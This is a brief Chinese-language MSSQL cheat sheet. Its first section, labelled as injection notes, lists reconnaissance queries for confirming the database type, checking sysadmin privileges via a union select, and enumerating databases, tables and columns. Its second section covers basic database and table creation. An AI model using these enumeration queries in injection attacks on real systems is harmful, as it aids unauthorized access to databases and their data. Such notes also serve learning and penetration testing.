# Mssql

## Mssql注入： ##

判断是否是Mssql数据库：

	select 1 where 1=1 and exists(select * from sysobjects)

如果正常返回，说明是Mssql

如果报错了，就不是

---

判断是否是数据库管理员：

	select 222 where 1=1 union select is_srvrolemember('sysadmin')

---

查询所有数据库：

	select name from master.dbo.sysdatabases;

---

查询当前数据库所有用户创建的表：
	
	select name from sysobjects where XType='u';

---

返回当前数据库名称：

	select db_name()
	
---

查看指定表下的字段：

	select name from syscolumns where id=object_id('表名')


mssql实现limit：

	（正数第几个）：
	select top 1 * from a_t where id not in (select top 2 id from a_t)

	（倒数第几个）：
	select top 1 * from a_t where id not in (select top 1 id from a_t order by id desc) order by id desc

---


## Mssql基础： ##

创建数据库：

	use master
	go
	create database a
	go

创建表：

	use a
	go
	create table a_t
	(
	 id int,
	 name char(8)
	)


